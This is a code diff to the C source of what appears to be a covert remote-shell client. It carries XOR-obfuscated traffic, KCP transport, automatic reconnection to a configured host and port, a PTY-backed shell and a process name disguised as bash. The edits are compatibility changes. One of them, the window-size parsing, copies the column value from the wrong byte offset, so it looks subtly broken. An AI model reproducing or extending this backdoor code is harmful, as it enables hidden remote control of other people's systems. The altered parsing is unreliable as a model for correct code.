@@ -76,7 +76,8 @@ static pid_t g_shell_pid = -1;
 static void crypto_xor(uint8_t *data, size_t len) {
     const uint8_t *key = (const uint8_t *)CRYPTO_KEY;
     size_t keylen = strlen(CRYPTO_KEY);
-    for (size_t i = 0; i < len; i++) {
+    size_t i;
+    for (i = 0; i < len; i++) {
         data[i] ^= key[i % keylen] ^ (uint8_t)(i & 0xFF);
     }
 }
@@ -352,8 +353,12 @@ static void run_loop(int fd, int is_kcp) {
                 case MSG_WINSIZE:
                     if (len == 4) {
                         struct winsize ws;
-                        ws.ws_row = ntohs(((uint16_t *)buf)[0]);
-                        ws.ws_col = ntohs(((uint16_t *)buf)[1]);
+                        uint16_t row_val;
+                        uint16_t col_val;
+                        memcpy(&row_val, &buf[0], sizeof(uint16_t));
+                        memcpy(&col_val, &buf[1], sizeof(uint16_t));
+                        ws.ws_row = ntohs(row_val);
+                        ws.ws_col = ntohs(col_val);
                         ws.ws_xpixel = 0;
                         ws.ws_ypixel = 0;
                         ioctl(g_master_fd, TIOCSWINSZ, &ws);
@@ -411,9 +416,10 @@ int main(int argc, char *argv[]) {
     char *bash_disguise = BASH_DISGUISE;
     int reconnect = RECONNECT_INTERVAL;
     int is_kcp = 0;
+    int i;
 
     // 解析参数
-    for (int i = 1; i < argc; i++) {
+    for (i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-h") == 0 && i + 1 < argc) {
             host = argv[++i];
         } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
